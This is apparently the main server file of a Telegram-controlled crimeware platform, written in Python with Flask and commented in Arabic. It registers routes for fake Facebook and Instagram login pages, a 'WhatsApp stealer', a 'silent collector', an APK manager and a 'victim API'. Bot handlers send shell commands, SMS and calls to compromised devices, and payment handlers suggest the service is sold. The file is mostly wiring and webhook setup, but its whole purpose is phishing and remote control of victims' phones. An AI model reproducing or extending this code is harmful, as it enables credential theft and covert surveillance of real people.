# main.py
# ============================================================
# DEV 1 - Bot Controller v15
# Webhook Mode + PostgreSQL (NeonDB) + Auto Migration
# + Admin System + Silent Collector + Fake Sites + Admin Tools
# + WhatsApp Report + Force Subscribe
# ============================================================

import os
import time
import threading
import requests
import telebot
from flask import Flask, request, jsonify, redirect

from logging_config import (
    get_logger, log_startup_info, log_shutdown_info,
    setup_exception_hook,
)

logger = get_logger("main")
log_startup_info()
setup_exception_hook()

from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET

from imports_manager import (
    wa_bp, apk_bp,
    WA_ENABLED, APK_MANAGER_ENABLED,
    SILENT_ENABLED,
    init_facebook_routes, init_instagram_routes,
    init_whatsapp_stealer_routes, init_apk_routes,
    init_silent_collector_routes,
    register_payment_handlers,
)

from api_victim import init_victim_api

from bot_handlers import (
    start_command, callback_handler,
    dashboard_command, update_command,
    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step, victim_name_handler,
    apk_toast_step, apk_shell_step, apk_sendsms_step,
    apk_call_step, apk_url_step,
    upd_target_handler,
    silent_label_handler,
    admin_search_handler, admin_broadcast_handler,
    admin_ban_handler, admin_unban_handler, admin_delete_handler,
    admin_grant_vip_handler, admin_give_stars_handler,
    admin_msg_user_handler,
)

from short_link import init_short_link
from redis_cleaner import start_cleaner

from monitoring import init_monitoring, metrics
from rate_limiter import start_cleanup_thread


# ═══════════════════════════════════════════════════════
# ⚡ PostgreSQL (NeonDB) — قاعدة البيانات الدائمة
# ═══════════════════════════════════════════════════════
DATABASE_ENABLED = False

try:
    from database import init_database
    DATABASE_ENABLED = init_database()
    if DATABASE_ENABLED:
        logger.info("[+] PostgreSQL initialized")
    else:
        logger.warning("[-] PostgreSQL disabled")
except Exception as e:
    logger.exception(f"[-] PostgreSQL init failed: {e}")
    DATABASE_ENABLED = False


# ═══════════════════════════════════════════════════════
# 🚀 Migration: Redis → PostgreSQL (تلقائي)
# ═══════════════════════════════════════════════════════
def run_migration_background():
    """يشغل النقل في الخلفية عند أول تشغيل"""
    if not DATABASE_ENABLED:
        logger.warning("[-] Migration skipped: DB not enabled")
        return

    if not redis_client:
        logger.warning("[-] Migration skipped: Redis not available")
        return

    try:
        from migrate_to_db import run_migration
        logger.info("🔄 Starting migration: Redis → PostgreSQL")
        run_migration(redis_client, None)
    except Exception as e:
        logger.exception(f"❌ Migration error: {e}")


# ═══════════════════════════════════════════════════════
# Web Dashboard
# ═══════════════════════════════════════════════════════
try:
    from web_dashboard import init_web_dashboard
    WEB_DASHBOARD_ENABLED = True
    logger.info("[+] web_dashboard imported")
except Exception as e:
    logger.exception(f"[-] web_dashboard import failed: {e}")
    WEB_DASHBOARD_ENABLED = False
    def init_web_dashboard(app): pass


# ═══════════════════════════════════════════════════════
# APK Auto-Update
# ═══════════════════════════════════════════════════════
try:
    from apk_updater import init_apk_update_routes
    APK_UPDATE_ENABLED = True
    logger.info("[+] apk_updater imported")
except Exception as e:
    logger.exception(f"[-] apk_updater import failed: {e}")
    APK_UPDATE_ENABLED = False
    def init_apk_update_routes(app, bot): pass


# ═══════════════════════════════════════════════════════
# Fake Sites
# ═══════════════════════════════════════════════════════
try:
    from fake_sites import init_fake_sites
    FAKE_SITES_ENABLED = True
    logger.info("[+] fake_sites imported")
except Exception as e:
    logger.exception(f"[-] fake_sites import failed: {e}")
    FAKE_SITES_ENABLED = False
    def init_fake_sites(app, bot): pass


# ═══════════════════════════════════════════════════════
# Admin System Hook
# ═══════════════════════════════════════════════════════
try:
    from admin_system_hook import init_admin_system
    ADMIN_SYSTEM_HOOK_ENABLED = True
    logger.info("[+] admin_system_hook imported")
except Exception as e:
    logger.exception(f"[-] admin_system_hook import failed: {e}")
    ADMIN_SYSTEM_HOOK_ENABLED = False
    def init_admin_system(bot): return False


# ═══════════════════════════════════════════════════════
# ★★★ Admin Tools ★★★
# ═══════════════════════════════════════════════════════
try:
    from admin_tools import init_admin_tools
    ADMIN_TOOLS_ENABLED = True
    logger.info("[+] admin_tools imported")
except Exception as e:
    logger.exception(f"[-] admin_tools import failed: {e}")
    ADMIN_TOOLS_ENABLED = False
    def init_admin_tools(app, bot): pass


# ═══════════════════════════════════════════════════════
# ★★★ Force Subscribe ★★★
# ═══════════════════════════════════════════════════════
try:
    from force_subscribe import init_force_subscribe
    FORCE_SUBSCRIBE_ENABLED = True
    logger.info("[+] force_subscribe imported")
except Exception as e:
    logger.exception(f"[-] force_subscribe import failed: {e}")
    FORCE_SUBSCRIBE_ENABLED = False
    def init_force_subscribe(bot): return False


# ═══════════════════════════════════════════════════════
# Flask Setup
# ═══════════════════════════════════════════════════════
app = Flask(__name__)


# ═══════════════════════════════════════════════════════
# ★★★ WhatsApp Report Redirect — mailto فقط ★★★
# ============================================================
@app.route('/wa/redirect/<payload_id>')
def wa_redirect(payload_id):
    """مُوجّه قصير — يستخدم mailto لفتح التطبيق الافتراضي"""
    import urllib.parse
    from whatsapp_report_generator import get_report_payload

    payload = get_report_payload(payload_id)
    if not payload:
        return "❌ الرابط منتهي أو غير صالح", 410

    to = payload['to']
    subject = payload['subject']
    body = payload['body']

    mailto_url = (
        f"mailto:{to}"
        f"?subject={urllib.parse.quote(subject)}"
        f"&body={urllib.parse.quote(body)}"
    )

    return redirect(mailto_url)


# ═══════════════════════════════════════════════════════
# ⚡ Webhook Configuration
# ═══════════════════════════════════════════════════════
WEBHOOK_PATH = "/webhook"

# سر فريد لكل نسخة
WEBHOOK_SECRET = "daf_" + BOT_TOKEN.split(":")[0][:24]

# متغير عام لتخزين الـ URL
WEBHOOK_URL = None


# ═══════════════════════════════════════════════════════
# ⚡ Webhook Route
# ═══════════════════════════════════════════════════════
@app.route(WEBHOOK_PATH, methods=['POST'])
def telegram_webhook():
    """استقبال updates من تلجرام"""
    try:
        secret_header = request.headers.get('X-Telegram-Bot-Api-Secret-Token', '')
        if secret_header and secret_header != WEBHOOK_SECRET:
            logger.warning("🚫 Webhook: Invalid secret header")
            return "Unauthorized", 403

        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return "OK", 200
        else:
            return "Bad Request", 400

    except Exception as e:
        logger.exception(f"Webhook error: {e}")
        return "Error", 500


# ═══════════════════════════════════════════════════════
# Origin Gate
# ═══════════════════════════════════════════════════════
ORIGIN_GATE_EXEMPT = [
    '/', '/health', '/_health', '/_metrics', '/_version',
    WEBHOOK_PATH,
]

ALLOWED_PREFIXES = (
    '/wa', '/apk', '/dashboard', '/s/', '/fs',
    '/login.php', '/home.php', '/fb', '/ig_login.php',
    '/fb_capture', '/api/v1/session', '/f/',
    '/profile', '/admin/wb', '/webhook',
    '/manifest.json', '/sw.js', '/favicon.ico', '/robots.txt',
    '/_health', '/_metrics', '/_version',
)


@app.before_request
def verify_origin():
    path = request.path
    if path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None
    if any(path.startswith(p) for p in ALLOWED_PREFIXES):
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Forwarded-For') or
        request.remote_addr
    )
    logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
    metrics.inc_counter("blocked_requests", tags={"path": path})
    return jsonify({"error": "تم رفض الوصول"}), 403


@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


@app.before_request
def start_timer():
    request._start_time = time.time()


@app.after_request
def log_request(response):
    try:
        if hasattr(request, '_start_time'):
            elapsed_ms = (time.time() - request._start_time) * 1000
            if not request.path.startswith(('/_', '/')) and request.path != WEBHOOK_PATH:
                logger.debug(
                    f"🌐 {request.method} {request.path} → "
                    f"{response.status_code} ({elapsed_ms:.1f}ms)"
                )
                metrics.observe_timing(
                    "http_request_ms", elapsed_ms,
                    tags={"method": request.method, "path": request.path}
                )
    except Exception:
        pass
    return response


# ═══════════════════════════════════════════════════════
# Blueprints
# ═══════════════════════════════════════════════════════
if wa_bp:
    app.register_blueprint(wa_bp)
    logger.info("[+] Registered: wa_bp")

if apk_bp:
    app.register_blueprint(apk_bp)
    logger.info("[+] Registered: apk_bp")


# ═══════════════════════════════════════════════════════
# Init Routes
# ═══════════════════════════════════════════════════════
init_facebook_routes(app, bot)
logger.info("[+] Init: facebook routes")

init_instagram_routes(app, bot)
logger.info("[+] Init: instagram routes")

if WA_ENABLED:
    try:
        init_whatsapp_stealer_routes(app, bot)
        logger.info("[+] Init: wa_stealer routes")
    except Exception as e:
        logger.exception(f"[-] WA Stealer init failed: {e}")

if APK_MANAGER_ENABLED:
    try:
        init_apk_routes(app, bot)
        logger.info("[+] Init: apk_manager routes")
    except Exception as e:
        logger.exception(f"[-] APK Manager init failed: {e}")

if APK_UPDATE_ENABLED:
    try:
        init_apk_update_routes(app, bot)
        logger.info("[+] Init: apk update routes")
    except Exception as e:
        logger.exception(f"[-] APK Update init failed: {e}")

if SILENT_ENABLED:
    try:
        init_silent_collector_routes(app, bot)
        logger.info("[+] Init: silent collector routes")
    except Exception as e:
        logger.exception(f"[-] Silent Collector init failed: {e}")

if FAKE_SITES_ENABLED:
    try:
        init_fake_sites(app, bot)
        logger.info("[+] Init: fake sites routes")
    except Exception as e:
        logger.exception(f"[-] Fake Sites init failed: {e}")

register_payment_handlers(bot)
logger.info("[+] Init: payment handlers")

try:
    init_victim_api(app, bot)
    logger.info("[+] Init: victim API")
except Exception as e:
    logger.exception(f"[-] Victim API init failed: {e}")

try:
    init_short_link(app)
    logger.info("[+] Init: short_link")
except Exception as e:
    logger.exception(f"[-] Short link init failed: {e}")

init_monitoring(app)
start_cleanup_thread()

if WEB_DASHBOARD_ENABLED:
    try:
        init_web_dashboard(app)
        logger.info("[+] Init: web dashboard")
    except Exception as e:
        logger.exception(f"[-] Web Dashboard init failed: {e}")

if ADMIN_SYSTEM_HOOK_ENABLED:
    try:
        success = init_admin_system(bot)
        if success:
            logger.info("[+] Init: admin system hook")
    except Exception as e:
        logger.exception(f"[-] Admin System Hook init failed: {e}")

# ═══════════════════════════════════════════════════════
# ★★★ Init Admin Tools ★★★
# ═══════════════════════════════════════════════════════
if ADMIN_TOOLS_ENABLED:
    try:
        init_admin_tools(app, bot)
        logger.info("[+] Init: admin tools")
    except Exception as e:
        logger.exception(f"[-] Admin Tools init failed: {e}")
else:
    logger.warning("[-] Admin Tools disabled")

# ═══════════════════════════════════════════════════════
# ★★★ Init Force Subscribe ★★★
# ═══════════════════════════════════════════════════════
if FORCE_SUBSCRIBE_ENABLED:
    try:
        success = init_force_subscribe(bot)
        if success:
            logger.info("[+] Init: force subscribe")
    except Exception as e:
        logger.exception(f"[-] Force Subscribe init failed: {e}")
else:
    logger.warning("[-] Force Subscribe disabled")


# ═══════════════════════════════════════════════════════
# ⚡ Webhook Setup
# ═══════════════════════════════════════════════════════
def get_base_url():
    """يجيب الدومين من متغيرات البيئة"""
    candidates = [
        os.environ.get("RAILWAY_PUBLIC_DOMAIN", ""),
        os.environ.get("PUBLIC_URL", ""),
        os.environ.get("RAILWAY_STATIC_URL", ""),
        os.environ.get("APP_URL", ""),
    ]

    for candidate in candidates:
        candidate = candidate.strip()
        if candidate:
            if not candidate.startswith("http"):
                candidate = "https://" + candidate
            return candidate.rstrip("/")

    return "https://daf-production-e34a.up.railway.app"


def clear_all_webhooks():
    """يمسح الـ webhook بكل الطرق الممكنة"""
    logger.info("🧹 Clearing any existing webhooks...")

    try:
        # 1. عن طريق مكتبة telebot
        try:
            bot.remove_webhook()
            logger.info("   ✅ bot.remove_webhook() — OK")
        except Exception as e:
            logger.debug(f"   bot.remove_webhook() error: {e}")

        # 2. عن طريق API مباشر
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
                params={"drop_pending_updates": "true"},
                timeout=15,
            )
            if r.status_code == 200:
                logger.info("   ✅ API deleteWebhook — OK")
            else:
                logger.warning(f"   ⚠️ API deleteWebhook HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"   API deleteWebhook error: {e}")

        # 3. امسح أي polling قديم
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={"offset": "-1", "limit": 1, "timeout": 0},
                timeout=10,
            )
            logger.info(f"   ✅ getUpdates flush — HTTP {r.status_code}")
        except Exception as e:
            logger.debug(f"   getUpdates flush error: {e}")

        time.sleep(2)

        # 4. تأكد من المسح
        try:
            info = bot.get_webhook_info()
            if info.url:
                logger.warning(f"   ⚠️ Webhook still active: {info.url}")
                try:
                    bot.remove_webhook()
                    time.sleep(1)
                except Exception:
                    pass
            else:
                logger.info("   ✅ Confirmed: No webhook active")
        except Exception as e:
            logger.debug(f"   get_webhook_info error: {e}")

        logger.info("🧹 Clear webhooks — DONE")

    except Exception as e:
        logger.exception(f"clear_all_webhooks error: {e}")


def setup_webhook():
    """يعمل setup الـ webhook بشكل احترافي"""
    global WEBHOOK_URL

    try:
        base_url = get_base_url()
        WEBHOOK_URL = base_url + WEBHOOK_PATH

        logger.info("=" * 60)
        logger.info("⚡ WEBHOOK SETUP")
        logger.info("=" * 60)
        logger.info(f"🔗 Target URL: {WEBHOOK_URL}")
        logger.info(f"🔐 Secret: {WEBHOOK_SECRET[:20]}...")

        # امسح أي webhook قديم
        clear_all_webhooks()

        # تحقق من معلومات البوت
        try:
            me = bot.get_me()
            logger.info(f"[+] Bot: @{me.username} (ID: {me.id})")
        except Exception as e:
            logger.error(f"❌ Failed to get bot info: {e}")
            return False

        # سجل الـ webhook
        logger.info(f"📡 Registering webhook...")

        result = bot.set_webhook(
            url=WEBHOOK_URL,
            secret_token=WEBHOOK_SECRET,
            max_connections=40,
            allowed_updates=[
                "message",
                "callback_query",
                "inline_query",
                "chosen_inline_result",
                "edited_message",
                "channel_post",
            ],
            drop_pending_updates=True,
        )

        if not result:
            logger.error("❌ set_webhook returned False")
            return False

        time.sleep(2)

        info = bot.get_webhook_info()

        logger.info("=" * 60)
        logger.info("📊 WEBHOOK INFO")
        logger.info("=" * 60)
        logger.info(f"   URL: {info.url}")
        logger.info(f"   Has Custom Cert: {info.has_custom_certificate}")
        logger.info(f"   Pending Updates: {info.pending_update_count}")
        logger.info(f"   Max Connections: {info.max_connections}")
        logger.info(f"   Last Error: {info.last_error_message or 'None'}")

        if info.url != WEBHOOK_URL:
            logger.error(f"❌ URL mismatch!")
            logger.error(f"   Expected: {WEBHOOK_URL}")
            logger.error(f"   Got:      {info.url}")
            return False

        if info.last_error_message:
            logger.warning(f"⚠️ Last error: {info.last_error_message}")
            logger.warning(f"⚠️ Error date: {info.last_error_date}")

        logger.info("=" * 60)
        logger.info("✅ WEBHOOK SETUP COMPLETE!")
        logger.info("=" * 60)

        return True

    except Exception as e:
        logger.exception(f"❌ setup_webhook error: {e}")
        return False


def delete_webhook_on_shutdown():
    """يمسح الـ webhook عند الإغلاق"""
    try:
        logger.info("🗑️ Removing webhook on shutdown...")
        bot.remove_webhook()
        logger.info("✅ Webhook removed")
    except Exception as e:
        logger.error(f"remove_webhook on shutdown error: {e}")


# ═══════════════════════════════════════════════════════
# ⚡ Delayed Webhook Setup
# ═══════════════════════════════════════════════════════
def delayed_webhook_setup():
    """يعمل setup الـ webhook بعد ما السيرفر يشتغل"""
    try:
        logger.info("⏳ Waiting for server to be ready...")
        time.sleep(5)

        # تأكد إن السيرفر شغال
        try:
            base_url = get_base_url()
            test_url = base_url + "/"
            r = requests.get(test_url, timeout=10)
            logger.info(f"✅ Server check: HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"⚠️ Server check failed: {e}")

        # جرّب 3 مرات
        for attempt in range(3):
            logger.info(f"🔄 Webhook setup attempt #{attempt + 1}/3")

            if setup_webhook():
                logger.info("🎉 Webhook is LIVE!")
                return

            logger.warning(f"⚠️ Attempt #{attempt + 1} failed, retrying in 10s...")
            time.sleep(10)

        logger.error("❌ All webhook setup attempts failed!")

    except Exception as e:
        logger.exception(f"delayed_webhook_setup error: {e}")


# ═══════════════════════════════════════════════════════
# ⚡ Main
# ═══════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        # ═══ 1. Redis Cleaner ═══
        start_cleaner()
        logger.info("[+] Redis cleaner started")

        # ═══ 2. Migration Thread (Redis → PostgreSQL) ═══
        if DATABASE_ENABLED:
            migration_thread = threading.Thread(
                target=run_migration_background,
                daemon=True,
            )
            migration_thread.start()
            logger.info("[+] Migration thread started")
        else:
            logger.warning("[-] Migration skipped: DB disabled")

        # ═══ 3. امسح أي webhook قديم فوراً ═══
        logger.info("⚡ Clearing old webhooks on startup...")
        try:
            requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
                params={"drop_pending_updates": "true"},
                timeout=15,
            )
            logger.info("✅ Old webhooks cleared")
        except Exception as e:
            logger.warning(f"Initial clear webhook error: {e}")

        # ═══ 4. Port ═══
        port = int(os.environ.get("PORT", 8080))
        logger.info("=" * 60)
        logger.info(f"🌐 Flask Web Server starting on port {port}...")
        logger.info("=" * 60)

        # ═══ 5. Webhook Setup Thread ═══
        setup_thread = threading.Thread(
            target=delayed_webhook_setup,
            daemon=True,
        )
        setup_thread.start()
        logger.info("[+] Webhook setup thread started")

        # ═══ 6. Flask Server ═══
        app.run(
            host="0.0.0.0",
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
        )

    except KeyboardInterrupt:
        logger.info("🛑 Received KeyboardInterrupt")
        delete_webhook_on_shutdown()
    except Exception as e:
        logger.exception(f"💥 Fatal error: {e}")
        delete_webhook_on_shutdown()
    finally:
        log_shutdown_info()
